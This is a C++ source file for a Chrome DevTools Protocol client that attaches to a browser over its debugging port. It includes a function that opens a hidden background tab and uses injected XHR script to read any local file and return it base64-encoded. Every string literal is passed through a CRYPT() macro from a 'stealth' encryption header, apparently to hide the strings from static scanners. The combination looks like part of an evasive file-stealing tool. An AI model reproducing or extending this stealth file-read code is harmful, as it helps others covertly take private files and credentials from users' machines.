#include "cdp/browser.h"
#include "../detail/channel.h"
#include "../detail/base64.h"
#include "../detail/json.hpp"
#include "cdp/page.h"
#include "../detail/http.h"
#include "stealth/encryption.hpp"

#include <iostream>
#include <fstream>
#include <thread>
#include <chrono>
#include <mutex>
#include <atomic>
#include <unordered_map>
#include <deque>
#include <condition_variable>
#include <set>
#include <map>
#include <unordered_set>

using json = njson::json;

// ---- debug toggles ----
static constexpr bool DEBUG_LOG_ALL_EVENTS = false;
static constexpr bool DEBUG_HEARTBEAT = false;

namespace cdp {

    namespace {
        std::string http_get(const std::string& host, const std::string& port, const std::string& target);

        std::string jsQuote(const std::string& s) {
            std::string out;
            out.reserve(s.size() + 2);
            out.push_back('"');

            for (unsigned char c : s) {
                switch (c) {
                case '"':  out += CRYPT("\\\""); break;
                case '\\': out += CRYPT("\\\\"); break;
                case '\b': out += CRYPT("\\b");  break;
                case '\f': out += CRYPT("\\f");  break;
                case '\n': out += CRYPT("\\n");  break;
                case '\r': out += CRYPT("\\r");  break;
                case '\t': out += CRYPT("\\t");  break;
                case '/':
                    out += CRYPT("\\/");
                    break;
                default:
                    if (c < 0x20) {
                        char buf[8];
                        std::snprintf(buf, sizeof(buf), "\\x%02X", c);
                        out += buf;
                    }
                    else {
                        out.push_back(static_cast<char>(c));
                    }
                    break;
                }
            }

            out.push_back('"');
            return out;
        }
    }

    struct Browser::Impl {
        std::shared_ptr<detail::Channel> channel = std::make_shared<detail::Channel>();
        std::string host;
        std::string port;
        uint16_t port_num = 0;
        bool connected = false;
    };

    // ==================== Constructors ====================
    Browser::Browser(std::string host, uint16_t port)
        : impl_(std::make_unique<Impl>())
    {
        impl_->host = std::move(host);
        impl_->port = std::to_string(port);
        impl_->port_num = port;
    }

    Browser::~Browser() = default;
    Browser::Browser(Browser&&) noexcept = default;
    Browser& Browser::operator=(Browser&&) noexcept = default;

    // ==================== Connection ====================
    bool Browser::connect() {
        try {
            std::string payload = detail::http_get(impl_->host, impl_->port, CRYPT("/json/version"));
            if (payload.empty()) return false;

            auto j = json::parse(payload);
            std::string ws_url = j.value(CRYPT("webSocketDebuggerUrl"), std::string{});
            if (ws_url.empty()) return false;

            auto pos = ws_url.find(CRYPT("/devtools"));
            if (pos == std::string::npos) return false;

            impl_->channel->connect(impl_->host, impl_->port, ws_url.substr(pos));
            impl_->connected = true;
            return true;
        }
        catch (...) {
            return false;
        }
    }

    bool Browser::isConnected() const noexcept {
        return impl_->connected && impl_->channel->is_connected();
    }

    Result<Page> Browser::anyPage() {
        if (!isConnected()) {
            return Error{ Errc::not_connected, CRYPT("Browser is not connected.") };
        }

        try {
            json targets = impl_->channel->result_of(CRYPT("Target.getTargets"), json::object(), "");
            for (const auto& t : targets[CRYPT("targetInfos")]) {
                if (t.value(CRYPT("type"), "") == CRYPT("page")) {
                    std::string target_id = t[CRYPT("targetId")];
                    std::string session_id = impl_->channel->result_of(
                        CRYPT("Target.attachToTarget"),
                        { {CRYPT("targetId"), target_id}, {CRYPT("flatten"), true} }, ""
                    )[CRYPT("sessionId")];
                    return Page{ impl_->channel, target_id, session_id };
                }
            }
            return Error{ Errc::not_connected, CRYPT("No open page found.") };
        }
        catch (const std::exception& e) {
            return Error{ Errc::bad_response, CRYPT("Failed to get page handle: ") + e.what() };
        }
    }

    Result<Page> Browser::currentPage() {
        if (!isConnected()) {
            return Error{ Errc::not_connected, CRYPT("Browser is not connected.") };
        }

        try {
            json targets = impl_->channel->result_of(CRYPT("Target.getTargets"), json::object(), "");
            std::vector<json> pages;

            for (const auto& t : targets[CRYPT("targetInfos")]) {
                if (t.value(CRYPT("type"), "") == CRYPT("page"))
                    pages.push_back(t);
            }

            if (pages.empty()) {
                return Error{ Errc::not_connected, CRYPT("No open pages found.") };
            }

            for (const auto& t : pages) {
                std::string target_id = t[CRYPT("targetId")];
                try {
                    json win = impl_->channel->result_of(CRYPT("Browser.getWindowForTarget"),
                        { {CRYPT("targetId"), target_id} }, "");
                    std::string state = win[CRYPT("bounds")].value(CRYPT("windowState"), CRYPT("normal"));
                    if (t.value(CRYPT("attached"), false) && state != CRYPT("minimized")) {
                        json attach = impl_->channel->result_of(CRYPT("Target.attachToTarget"),
                            { {CRYPT("targetId"), target_id}, {CRYPT("flatten"), true} }, "");
                        return Page{ impl_->channel, target_id, attach[CRYPT("sessionId")] };
                    }
                }
                catch (...) { continue; }
            }

            for (const auto& t : pages) {
                if (t.value(CRYPT("attached"), false)) {
                    std::string target_id = t[CRYPT("targetId")];
                    json attach = impl_->channel->result_of(CRYPT("Target.attachToTarget"),
                        { {CRYPT("targetId"), target_id}, {CRYPT("flatten"), true} }, "");
                    return Page{ impl_->channel, target_id, attach[CRYPT("sessionId")] };
                }
            }

            std::string target_id = pages[0][CRYPT("targetId")];
            json attach = impl_->channel->result_of(CRYPT("Target.attachToTarget"),
                { {CRYPT("targetId"), target_id}, {CRYPT("flatten"), true} }, "");
            return Page{ impl_->channel, target_id, attach[CRYPT("sessionId")] };
        }
        catch (const std::exception& e) {
            return Error{ Errc::bad_response, CRYPT("Failed to get current page: ") + e.what() };
        }
    }

    Result<std::string> Browser::readFileViaFileURI(const std::string& localPath) {
        if (!isConnected())
            return Error{ Errc::not_connected, CRYPT("Browser is not connected.") };

        std::string target = localPath;
        std::replace(target.begin(), target.end(), '\\', '/');

        const std::string fileUrl = CRYPT("file:///") + target;
        const std::string dirUrl = CRYPT("file:///") + target.substr(0, target.find_last_of('/')) + "/";

        try {
            std::string target_id = impl_->channel->result_of(
                CRYPT("Target.createTarget"),
                json{ {CRYPT("url"), dirUrl}, {CRYPT("background"), true} }, ""
            )[CRYPT("targetId")];

            struct TargetGuard {
                detail::Channel* ch;
                std::string tid;
                ~TargetGuard() {
                    if (ch && !tid.empty()) {
                        try {
                            ch->result_of(CRYPT("Target.closeTarget"), json{ {CRYPT("targetId"), tid} }, "");
                        }
                        catch (...) {}
                    }
                }
            } tguard{ impl_->channel.get(), target_id };

            std::string session_id = impl_->channel->result_of(
                CRYPT("Target.attachToTarget"),
                json{ {CRYPT("targetId"), target_id}, {CRYPT("flatten"), true} }, ""
            )[CRYPT("sessionId")];

            Page page{ impl_->channel, target_id, session_id };

            bool loaded = false;
            for (int i = 0; i < 200; ++i) {
                auto rs = page.evaluate(CRYPT("document.readyState"));
                if (rs && rs.value().find(CRYPT("complete")) != std::string::npos) {
                    loaded = true;
                    break;
                }
                std::this_thread::sleep_for(std::chrono::milliseconds(50));
            }
            if (!loaded)
                return Error{ Errc::timeout, CRYPT("Directory listing did not finish loading.") };

            const std::string script =
                CRYPT("(function () {\n"
                    " var xhr = new XMLHttpRequest();\n"
                    " xhr.open('GET', ") + jsQuote(fileUrl) + CRYPT(", false);\n"
                        " xhr.overrideMimeType('text/plain; charset=x-user-defined');\n"
                        " xhr.send();\n"
                        " if (xhr.status && xhr.status !== 200 && xhr.status !== 0)\n"
                        " throw new Error('HTTP ' + xhr.status);\n"
                        " var t = xhr.responseText, bin = '';\n"
                        " for (var i = 0; i < t.length; i++)\n"
                        " bin += String.fromCharCode(t.charCodeAt(i) & 0xff);\n"
                        " return btoa(bin);\n"
                        "})()");

            auto b64 = page.evaluate(script);
            if (!b64) return b64.error();
            if (b64.value().empty())
                return Error{ Errc::bad_response, CRYPT("XHR returned no data (file:// access blocked — need --allow-file-access-from-files?).") };

            return cdp::detail::base64Decode(b64.value());
        }
        catch (const std::exception& e) {
            return Error{ Errc::bad_response, CRYPT("readFileViaFileURI failed: ") + e.what() };
        }
    }

} // namespace cdp